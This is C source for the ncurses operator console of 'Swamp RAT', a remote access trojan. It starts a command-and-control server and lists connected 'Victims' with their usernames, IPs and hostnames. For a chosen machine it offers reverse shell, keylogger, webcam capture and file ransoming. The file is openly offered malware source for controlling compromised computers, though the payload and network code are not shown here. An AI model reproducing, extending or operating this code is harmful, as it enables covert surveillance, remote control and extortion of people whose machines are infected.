/*-----------------------------------------------------------------------\
| Copyright (C) 2018  Lilly Chalupowski                                  |
|                                                                        |
| This program is free software: you can redistribute it and/or modify   |
| it under the terms of the GNU General Public License as published by   |
| the Free Software Foundation, either version 3 of the License, or      |
| (at your option) any later version.                                    |
|                                                                        |
| This program is distributed in the hope that it will be useful,        |
| but WITHOUT ANY WARRANTY; without even the implied warranty of         |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          |
| GNU General Public License for more details.                           |
|                                                                        |
| You should have received a copy of the GNU General Public License      |
| along with this program.  If not, see <https://www.gnu.org/licenses/>. |
\-----------------------------------------------------------------------*/

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <ncurses.h>
#include <menu.h>
#include <errno.h>
#include <pthread.h>
#include "net.h"
#include "../common.h"

#ifndef ARRAY_SIZE
#define ARRAY_SIZE(a) (sizeof(a) / sizeof(a[0]))
#endif

int y_margin = 4;
int x_margin = 8;

pthread_mutex_t NCURSES_PTHREAD_MUTEX = PTHREAD_MUTEX_INITIALIZER;

#ifndef NCURSES_WMENU
#define NCURSES_WMENU_COLOR 2
#define NCURSES_WMENU
#endif

int NCURSES_WMENU_POS = 0;

WINDOW *ncurses_wmenu_create(WINDOW *win_main){
  /*
    :TODO: create menu window
    :returns: (WINDOW *)
  */
  WINDOW *win_menu;
  int y, x;
  getmaxyx(win_main, y, x);
  win_menu = newwin((y - (y_margin * 2)),
                    (x - (x_margin * 2)),
                    2,
                    4);
  init_pair(NCURSES_WMENU_COLOR, COLOR_RED, COLOR_BLACK);
  wbkgd(win_menu, COLOR_PAIR(NCURSES_WMENU_COLOR));
  return win_menu;
}

bool ncurses_wmenu(WINDOW *win_main,
                   WINDOW *win_menu,
                   char *win_menu_title){
  /*
    :TODO: draw menu screen
    :win_mein: main window
    :win_menu: target menu window
    :win_menu_title: menu title
    :returns: boolean
  */
  int y, x;
  getmaxyx(win_main, y, x);
  wresize(win_menu,
          (y - y_margin),
          (x - x_margin));
  box(win_menu, 0, 0);
  mvwprintw(win_menu,
            1,
            (x / 2) - strlen(win_menu_title),
            "%s",
            win_menu_title);
  mvwaddch(win_menu, 2, 0, ACS_LTEE);
  mvwhline(win_menu,
           2,
           1,
           ACS_HLINE,
           (x - x_margin) - 2);
  mvwaddch(win_menu,
           2,
           (x - x_margin) - 1,
           ACS_RTEE);
  return true;
}

bool ncurses_menu_free(MENU *menu, ITEM **items, int n_items){
  unpost_menu(menu);
  free_menu(menu);
  for(int i = 0; i < n_items; ++i){
    free_item(items[i]);
  }
  return true;
}

#ifndef NCF_OPTS
#define NCF_OPTS_SHELL  1
#define NCF_OPTS_KEYLOG 2
#define NCF_OPTS_WEBCAM 3
#define NCF_OPTS_RANSOM 4
#define NCF_OPTS_BACK   5
#define NCF_OPTS
#endif

int ncurses_wcmd_select(WINDOW *win_main, WINDOW *win_menu, char *uuid){
  MENU *menu;
  int n_choices, key;
  ITEM **item_options;
  char *options[] = {
    "reverse shell",
    "keylogger",
    "webcam",
    "ransom files",
    "back",
  };
  int x, y;
  n_choices = ARRAY_SIZE(options);
  item_options = (ITEM **)calloc(n_choices + 1, sizeof(ITEM *));
  for(int i = 0; i < n_choices; ++i){
    item_options[i] = new_item(itoa(i+1), options[i]);
  }
  item_options[n_choices] = (ITEM *)NULL;
  menu = new_menu((ITEM **)item_options);
  getmaxyx(win_main, y, x);
  wresize(win_menu,
          (y - y_margin),
          (x - x_margin));
  keypad(win_menu, TRUE);
  wclear(win_menu);
  set_menu_win(menu, win_menu);
  set_menu_sub(menu,
               derwin(win_menu,
                      y - (y_margin * 2),
                      x - (x_margin * 2),
                      3,
                      1)
               );
  set_menu_mark(menu, " -> ");
  set_menu_format(menu,
                  (y - (y_margin * 2)),
                  1);
  ncurses_wmenu(win_main, win_menu, uuid);
  post_menu(menu);
  wrefresh(win_menu);
  while (true){
    key = wgetch(win_menu);
    if (key == KEY_DOWN){
      menu_driver(menu, REQ_DOWN_ITEM);
    }
    if (key == KEY_UP){
      menu_driver(menu, REQ_UP_ITEM);
    }
    if (key == KEY_NPAGE){
      menu_driver(menu, REQ_SCR_DPAGE);
    }
    if (key == KEY_PPAGE){
      menu_driver(menu, REQ_SCR_UPAGE);
    }
    if (key == KEY_LEFT){
      break;
    }
    if (key == 10 || key == KEY_ENTER || key == KEY_RIGHT){
      ITEM *item_selected;
      item_selected = current_item(menu);
      int option = atoi(item_name(item_selected));
      ncurses_menu_free(menu, item_options, n_choices);
      return option;
    }
  }
  ncurses_menu_free(menu, item_options, n_choices);
  return -1;
}

ITEM **ncurses_item_victims_create(){
  /*
    :TODO: creates victim items
    :returns: (ITEM **)
  */
  ITEM **items;
  items = malloc(NET_MAX_CLIENTS * sizeof(ITEM));
  if (items == NULL){
    fprintf(stderr, "%s", strerror(errno));
    exit(EXIT_FAILURE);
  }
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    items[i] = NULL;
  }
  return items;
}

bool ncurses_menu_pos_update(MENU *menu){
  ITEM *item;
  item = current_item(menu);
  NCURSES_WMENU_POS = item_index(item);
  return true;
}

char *ncurses_victim_description(sys_info_t *sysinfo){
  /*
    :TODO: concatinate description for victim
    :returns: (char *)
  */
  char *result;
  asprintf(&result,
           "%s@%s arch:%s release:%s hostname:%s load:%d",
           sysinfo->username,
           sysinfo->ip,
           sysinfo->arch,
           sysinfo->release,
           sysinfo->hostname,
           sysinfo->cpu_usage);
  return result;
}

MENU *ncurses_wmenu_update(WINDOW *win_main,
                          WINDOW *win_menu,
                          ITEM **items,
                          net_client_beacon_t **p_victims){
  /*
    :TODO: update menu window
    :returns: (MENU *)
  */
  pthread_mutex_lock(&NCURSES_PTHREAD_MUTEX);
  MENU *menu;
  int y, x;
  getmaxyx(win_main, y, x);
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    if (items[i] != NULL){
      items[i] = NULL;
      free_item(items[i]);
    }
  }
  int i_items = 0;
  for (int i = 0; i < NET_MAX_CLIENTS; i++){
    if (p_victims[i] != NULL){
      items[i_items] = new_item(p_victims[i]->sysinfo.uuid,
                                ncurses_victim_description(&p_victims[i]->sysinfo));
      i_items++;
    }
  }
  ncurses_wmenu(win_main, win_menu, "Victims");
  menu = new_menu(items);
  set_menu_win(menu, win_menu);
  set_menu_sub(menu, derwin(win_menu,
                            (y - (y_margin * 2)),
                            (x - (x_margin * 2) + 5),
                            3,
                            1));
  set_menu_format(menu,
                  (y - (y_margin * 2)),
                  1);
  set_menu_mark(menu, " -> ");
  post_menu(menu);
  pthread_mutex_unlock(&NCURSES_PTHREAD_MUTEX);
  return menu;
}

#ifndef NCURSES_WMAIN
#define NCURSES_WMAIN_COLOR 1
#define NCURSES_WMAIN
#endif

WINDOW *ncurses_wmain_create(int port,
                          net_client_beacon_t **p_victims,
                          net_server_beacon_t **p_commands){
  /*
    :TODO: initalize main window
    :port: server port
    :p_victims: pointer to victims data structure
    :p_commands: pointer to queued commands
    :returns: boolean
  */
  WINDOW *win_main;
  win_main = initscr();
  if (start_color() == ERR || !has_colors() || !can_change_color()){
    fprintf(stderr, "%s\n", strerror(errno));
    return false;
  }
  if (net_server_async(port, p_victims, p_commands) == false){
    fprintf(stderr, "[x] failed to initalize cnc server\n");
    return false;
  }
  noecho();
  curs_set(0);
  init_pair(NCURSES_WMAIN_COLOR, COLOR_GREEN, COLOR_BLACK);
  wbkgd(win_main, COLOR_PAIR(NCURSES_WMAIN_COLOR));
  return win_main;
}

bool ncurses_wmain_update(WINDOW *win_main){
  /*
    :TODO: update main window
    :win_main: main window pointer
    :returns: boolean
  */
  pthread_mutex_lock(&NCURSES_PTHREAD_MUTEX);
  int y, x;
  char win_main_title[] = "|Swamp RAT|";
  char win_main_footer[] = "|lillypad|";
  char win_main_logo[] = "~~(__`*>";
  getmaxyx(win_main, y, x);
  wresize(win_main, y, x);
  box(win_main, 0, 0);
  mvwprintw(win_main,
            0,
            (x / 2) - (strlen(win_main_title) / 2),
            win_main_title);
  mvwprintw(win_main,
            y - 1,
            (x / 2) - (strlen(win_main_footer) / 2),
            win_main_footer);
  mvwprintw(win_main,
            1,
            1,
            "victims: %d",
            NET_VICTIMS_TOTAL);
  mvwprintw(win_main,
            y - 2,
            1,
            "commands: %d",
            NET_COMMANDS_TOTAL);
  mvwprintw(win_main,
            1,
            (x - 1) - strlen(win_main_logo),
            win_main_logo);
  pthread_mutex_unlock(&NCURSES_PTHREAD_MUTEX);
  return true;
}

typedef struct{
  WINDOW *win_main;
  WINDOW *win_menu;
  MENU *p_menu_victims;
  ITEM **p_item_victims;
  net_client_beacon_t **p_victims;
  net_server_beacon_t **p_commands;
} ncurses_pthread_wmain_update_args_t;

void *ncurses_pthread_wmain_update(void *args){
  /*
    :TODO: pthread to update main window/menu on new connections or command queue
    :returns: NULL
  */
  ncurses_pthread_wmain_update_args_t *p_args = args;
  while (true){
    wclear(p_args->win_main);
    wclear(p_args->win_menu);
    ncurses_wmain_update(p_args->win_main);
    p_args->p_menu_victims = ncurses_wmenu_update(p_args->win_main,
                                                  p_args->win_menu,
                                                  p_args->p_item_victims,
                                                  p_args->p_victims);
    if (NET_VICTIMS_TOTAL != 0){
      if (NCURSES_WMENU_POS > (NET_VICTIMS_TOTAL - 1)){
        NCURSES_WMENU_POS = NET_VICTIMS_TOTAL - 1;
        set_current_item(p_args->p_menu_victims,
                         p_args->p_item_victims[NCURSES_WMENU_POS]);
      } else {
        set_current_item(p_args->p_menu_victims,
                         p_args->p_item_victims[NCURSES_WMENU_POS]);
      }
    } 
    wrefresh(p_args->win_main);
    wrefresh(p_args->win_menu);
    sleep(1);
  }
  free(args);
  pthread_exit(NULL);
}

bool ncurses_main(int port){
  int key;

  if (putenv("TERM=linux") != 0){
    fprintf(stderr, "%s\n", strerror(errno));
    return false;
  }

  net_client_beacon_t **p_victims = net_create_victims();
  net_server_beacon_t **p_commands = net_create_commands();

  ITEM **p_item_victims = ncurses_item_victims_create();

  WINDOW *win_main = ncurses_wmain_create(port, p_victims, p_commands);
  ncurses_wmain_update(win_main);

  WINDOW *win_menu = ncurses_wmenu_create(win_main);
  MENU *p_menu_victims = ncurses_wmenu_update(win_main,
                                              win_menu,
                                              p_item_victims,
                                              p_victims);

  wrefresh(win_main);
  wrefresh(win_menu);

  pthread_t t_ncurses_pthread_wmain_update;
  ncurses_pthread_wmain_update_args_t *p_ncurses_pthread_wmain_update_args = malloc(sizeof(ncurses_pthread_wmain_update_args_t));
  p_ncurses_pthread_wmain_update_args->win_main = win_main;
  p_ncurses_pthread_wmain_update_args->win_menu = win_menu;
  p_ncurses_pthread_wmain_update_args->p_victims = p_victims;
  p_ncurses_pthread_wmain_update_args->p_commands = p_commands;
  p_ncurses_pthread_wmain_update_args->p_item_victims = p_item_victims;
  p_ncurses_pthread_wmain_update_args->p_menu_victims = p_menu_victims;
  pthread_create(&t_ncurses_pthread_wmain_update,
                 NULL,
                 ncurses_pthread_wmain_update,
                 p_ncurses_pthread_wmain_update_args);

  keypad(win_menu, TRUE);
  
  while (true){
    key = wgetch(win_menu);
    if (key == KEY_RESIZE){
      wclear(win_main);
      wclear(win_menu);
      ncurses_wmain_update(win_main);
      p_menu_victims = ncurses_wmenu_update(win_main,
                                            win_menu,
                                            p_item_victims,
                                            p_victims);
      set_current_item(p_menu_victims, p_item_victims[NCURSES_WMENU_POS]);
      wrefresh(win_main);
      wrefresh(win_menu);
    }
    if (key == KEY_DOWN && (NCURSES_WMENU_POS < (NET_VICTIMS_TOTAL - 1))){
      p_menu_victims = ncurses_wmenu_update(win_main,
                                            win_menu,
                                            p_item_victims,
                                            p_victims);
      set_current_item(p_menu_victims, p_item_victims[NCURSES_WMENU_POS + 1]);
      NCURSES_WMENU_POS = NCURSES_WMENU_POS + 1;
      wrefresh(win_menu);
    }
    if (key == KEY_UP && NCURSES_WMENU_POS > 0){
      p_menu_victims = ncurses_wmenu_update(win_main,
                                            win_menu,
                                            p_item_victims,
                                            p_victims);
      set_current_item(p_menu_victims, p_item_victims[NCURSES_WMENU_POS - 1]);
      NCURSES_WMENU_POS = NCURSES_WMENU_POS - 1;
      wrefresh(win_menu);
    }
    if (key == 10 || key == KEY_ENTER){
      continue;
    }
  }
  ncurses_menu_free(p_menu_victims,
                    p_item_victims,
                    NET_MAX_CLIENTS);
  net_cleanup_victims(p_victims);
  net_cleanup_commands(p_commands);
  endwin();
  return true;
}
